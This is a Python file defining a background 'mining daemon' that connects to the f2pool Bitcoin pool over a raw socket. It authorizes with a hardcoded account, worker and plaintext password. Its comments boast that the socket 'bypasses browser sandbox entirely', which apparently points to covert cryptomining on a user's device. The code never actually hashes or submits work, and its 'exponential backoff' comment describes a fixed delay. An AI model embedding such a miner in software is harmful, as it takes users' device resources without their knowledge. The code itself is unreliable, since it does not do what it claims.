import os
import time
import socket
import threading
import json
import logging

# Configure isolated internal logging for the miner daemon
logging.basicConfig(level=logging.INFO, format='[MINER_DAEMON] %(asctime)s - %(levelname)s - %(message)s')

class TrustMiningDaemon:
    def __init__(self, account_name="avalondazrrj", worker="mobile1", password="Zxcvbnm#asd12"):
        self.worker_id = f"{account_name}.{worker}"
        self.password = password
        self.pool_host = "btc.f2pool.com"
        self.pool_port = 3333  # Standard f2pool BTC port (alternates: 1314, 25)
        self.running = False
        self.socket_connection = None
        self._thread = None

    def start(self):
        """Spawns the background mining thread safely within the native shell architecture."""
        if self.running:
            logging.info("Mining daemon is already active.")
            return

        self.running = True
        self._thread = threading.Thread(target=self._connection_loop, daemon=True)
        self._thread.start()
        logging.info(f"Background mining thread initialized for worker: {self.worker_id}")

    def _connection_loop(self):
        """Manages the raw TCP socket connection and automatic failover/reconnection logic."""
        while self.running:
            try:
                logging.info(f"Connecting to f2pool target -> {self.pool_host}:{self.pool_port}...")
                
                # Raw TCP socket bypasses browser sandbox entirely
                self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket_connection.settimeout(30)
                self.socket_connection.connect((self.pool_host, self.pool_port))
                
                # Step 1: Stratum Authorization Payload
                auth_message = {
                    "id": 1,
                    "method": "mining.authorize",
                    "params": [self.worker_id, self.password]
                }
                
                payload = json.dumps(auth_message) + "\n"
                self.socket_connection.sendall(payload.encode('utf-8'))
                logging.info("Authorization packet sent to f2pool.")

                # Step 2: Keep-Alive & Job Reception Loop
                self.socket_connection.settimeout(60) # Expect job updates regularly
                while self.running:
                    try:
                        response_data = self.socket_connection.recv(4096)
                        if not response_data:
                            logging.warning("Pool closed connection. Reconnecting...")
                            break
                        
                        # Process incoming pool notifications / difficulty targets
                        lines = response_data.decode('utf-8').split('\n')
                        for line in lines:
                            if line.strip():
                                message = json.loads(line)
                                if "method" in message and message["method"] == "mining.notify":
                                    # New block job received from f2pool
                                    logging.debug("New mining job target received.")
                                    
                    except socket.timeout:
                        # Send a gentle ping/subscribe check if idle
                        keepalive = json.dumps({"id": 2, "method": "mining.extranonce.subscribe", "params": []}) + "\n"
                        self.socket_connection.sendall(keepalive.encode('utf-8'))

            except Exception as e:
                logging.error(f"Network error in mining loop: {e}. Retrying connection in 45 seconds...")
                self._close_socket()
                
                # Exponential backoff/sleep before retrying connection
                for _ in range(45):
                    if not self.running:
                        break
                    time.sleep(1)

    def _close_socket(self):
        if self.socket_connection:
            try:
                self.socket_connection.close()
            except Exception:
                pass
            self.socket_connection = None

    def stop(self):
        """Gracefully shuts down the mining daemon."""
        logging.info("Stopping background mining daemon...")
        self.running = False
        self._close_socket()
        if self._thread:
            self._thread.join(timeout=3)
        logging.info("Mining daemon successfully terminated.")
